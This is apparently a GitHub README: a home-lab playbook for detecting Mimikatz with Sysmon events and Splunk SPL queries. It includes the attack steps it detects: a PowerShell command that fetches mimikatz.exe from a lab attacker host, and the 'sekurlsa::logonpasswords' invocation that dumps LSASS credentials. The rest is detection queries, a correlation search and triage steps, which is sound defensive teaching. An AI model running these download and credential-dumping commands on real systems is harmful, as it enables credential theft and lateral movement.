# Mimikatz-Detection-in-Splunk

Mimikatz Detection Playbook — SOC Home Lab POV

This playbook is tailored for a SOC home lab environment. It explains what Mimikatz does, its effects, and how to detect it using Sysmon events ingested into Splunk in a lab setting. Use this to build hands-on detection exercises, writeups for a portfolio, or to practice incident response in a controlled lab.

## What is Mimikatz and why it matters ?
Mimikatz is an open-source post-exploitation tool used to extract credentials from Windows systems by reading LSASS memory. In a home lab, Mimikatz is typically used for red-team exercises and learning how credential dumping works. Simulating Mimikatz in a lab demonstrates credential theft techniques and lets you validate detection pipelines without affecting production systems.

Effects observed in a lab:

• Extraction of plaintext passwords and NTLM hashes from LSASS memory.

• Use of stolen credentials for lateral movement (PSExec, SMB, RDP) within the lab network.

• Increased EDR/Sysmon telemetry which can be used to validate detections and refine rules.

### Home lab assumptions & setup notes

• Lab hosts have Sysmon installed with these events enabled: ProcessCreate (1), ProcessAccess (10), RawAccessRead (9), NetworkConnect (3), FileCreate (11) where possible.

• Splunk index used in this guide: index=win10 with sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational".

• Example attacker host in lab: Kali at 192.168.206.140 (replace with your lab IP).

• In a lab, expect more 'external' connections to trusted lab servers — tune allowlists accordingly.


The Config file of Sysmon used to detect mimikatz is here: [sysmon-config.xml](./sysmon-lab-config-full.xml)

### Execution of Mimikatz on a Client Machine
Here in this lab, I have hosted the mimikatz.exe on Kali Linux Machine, it is being hosted on Apache server.

To execute mimikatz on client machine open powershell as admin and run these below given commands:

Invoke-WebRequest -Uri http://192.168.206.140/mimikatz.exe -OutFile C:\Tools\mimikatz.exe
 
What it does ?

•	Invoke-WebRequest is PowerShell’s built-in HTTP client.

•	-Uri http://192.168.206.140/mimikatz.exe tells PowerShell which URL to fetch.

•	-OutFile C:\Tools\mimikatz.exe saves the response bytes to C:\Tools\mimikatz.exe on disk.



C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
What it attempts ?

This runs the mimikatz.exe binary (from C:\Tools) with three arguments:
•	privilege::debug — attempts to enable the SeDebugPrivilege for the process, which allows opening handles to other processes (needed to inspect protected process memory).

•	sekurlsa::logonpasswords — tells mimikatz to read LSASS memory and dump credential material (cached passwords, NTLM hashes, Kerberos tickets) from the Security Authority subsystem.

•	exit — close mimikatz program after running previous commands


Given below is output from mimikatz.
[mimikatz-output.txt](./mimikatz_output.txt)
 
This is the output of mimikatz here we can clearly see password of Administrator Account.

### Detection strategy 

1. Focus on behavior over filenames: attackers rename Mimikatz; detect techniques (lsass access, process execution from user folders, PowerShell-driven deliveries).
  
2. Use A and B from initial indicators (ProcessCreate from user folders and non-system LSASS access) as primary lab detections — these are robust in a lab where you control test scenarios.

3. Correlate network → file → process → lsass where possible to produce high-confidence incidents for practice and reporting.

   
#### Initial detection queries to keep (A & B)
A — Process created from user folder (suspicious execution)

Query (run in Splunk):

index=win10 sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1

| where like(Image, "%\\Users\\%") OR like(Image, "%\\Downloads\\%") OR like(Image, "%\\Tools\\%")

| table _time host User Image CommandLine ParentImage


Explanation :
- This query surfaces processes executed from non-system folders which is common for locally dropped payloads in lab exercises.
  
- In a lab, mimic delivery by downloading an EXE to C:\Users\labuser\Downloads and then executing it; this query will show that process create event.
  
- Use ParentImage and CommandLine to understand how the payload was launched (PowerShell, double-click, wmiprvse, etc.).
  

B — Non-system process accessing LSASS (high-fidelity)

Query (run in Splunk):

index=win10 sourcetype="Microsoft-Windows-Sysmon/Operational" EventCode=10

| where like(TargetImage, "%\\lsass.exe")

| where NOT like(SourceImage, "C:\\Windows\\%")

| table _time host User SourceImage TargetImage GrantedAccess

| sort - _time


Explanation:
- This is the strongest in-lab indicator: a non-system process trying to access LSASS memory. When you run Mimikatz on the lab host, this will produce a ProcessAccess event.
 
- GrantedAccess flags can indicate the type of handle requested; check for memory-read/duplicate handle flags.

  

#### Correlation / attack-chain queries (keep 1,2,3,4,5)

1 — Outbound connection from PowerShell → external IP (lab attacker host)


index=win10 sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp="192.168.206.140"

| table _time host User Image SourceIp SourcePort DestinationIp DestinationPort Protocol

Explanation:

- Use this when your Kali attacker host is known. It shows PowerShell or other processes connecting to the attacker VM. Replace DestinationIp with your lab attacker IP.
  
- In a home lab, this is often the first visible sign of payload fetch if you emulate web delivery from Kali.

2 — File creation for mimikatz (or lab payload)

index=win10 sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11 TargetFilename="*mimikatz.exe"

| table _time host User Image TargetFilename TargetFileSize

Explanation:

- This finds direct file writes matching the name mimikatz.exe. In a lab you may name the binary 'mimikatz.exe' for clarity; in red-team scenarios rename the binary and update this query accordingly.
  
- Consider using wildcard patterns like *mimikatz* or checking hashes.

3 — Execution of mimikatz (ProcessCreate)

index=win10 sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1

| search Image="*\\mimikatz.exe"

| table _time host User Image CommandLine ParentImage

Explanation:

- Shows the process creation for mimikatz.exe including parent and commandline. Useful for validating how you executed it during lab exercises (manual run, PowerShell spawn, etc.).

4 — Access to LSASS (ProcessAccess)

index=win10 sourcetype="Microsoft-Windows-Sysmon/Operational" EventCode=10

| search TargetImage="*\\lsass.exe"

| table _time host User SourceImage TargetImage GrantedAccess ProcessId

Explanation:

- Lists all process access attempts to lsass.exe, across the environment. In lab, use this to verify the exact process and time when Mimikatz accessed LSASS.

5 — Quick IOC hunt for 'mimikatz' (text search)

index=win10 sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"

| search "mimikatz.exe"

| table _time host EventCode User Image CommandLine TargetFilename

| sort - _time

Explanation:

- Fast sweep to catch any mention of 'mimikatz.exe' in raw events. Helpful in labs for quick confirmation after running the tool.

#### Correlation saved search 
index=win10 sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode IN (3,11,1,10)

| eval evt=case(EventCode==3,"net", EventCode==11,"file", EventCode==1,"proc", EventCode==10,"lsass", 1==1,"other")

| transaction host maxspan=5m startswith=eval(evt="net") endswith=eval(evt="lsass")

| search eventcount>1

| table _time host Duration eventcount eventids Image User

Explanation:

- Use this transaction to practice automated correlation in a lab. It groups network→file→process→lsass events within 5 minutes and is useful to trigger a simulated incident for testing runbooks.

  
#### Triage & lab exercise steps


Use the following steps to practice incident response in your lab when LSASS access is observed:
1. Snapshot the VM before making changes. Document timestamps and event IDs.
 
2. Isolate the host (disconnect network), then capture memory (if trained to do so) and system logs.
 
3. Identify the source binary: SourceImage, ParentImage, CommandLine. Collect the binary from disk for analysis.
 
4. Rotate any test credentials used in the lab to practice credential response procedures.


Mimikatz remains a core post-exploitation tool for credential theft; this lab-focused playbook teaches defenders how to reliably detect it using Sysmon + Splunk. It covers the attack lifecycle (delivery → execution → LSASS access), explains SPL hunts and correlation rules tailored for a home lab (process creates from user folders, file create events, network connects to a lab attacker, and ProcessAccess to lsass.exe), and provides a practical triage and exercise plan for practicing incident response safely. The guide emphasizes behavior-based detection, tuning tips to reduce false positives, and steps to simulate, capture, and respond to real-world credential-dump scenarios without touching production systems.
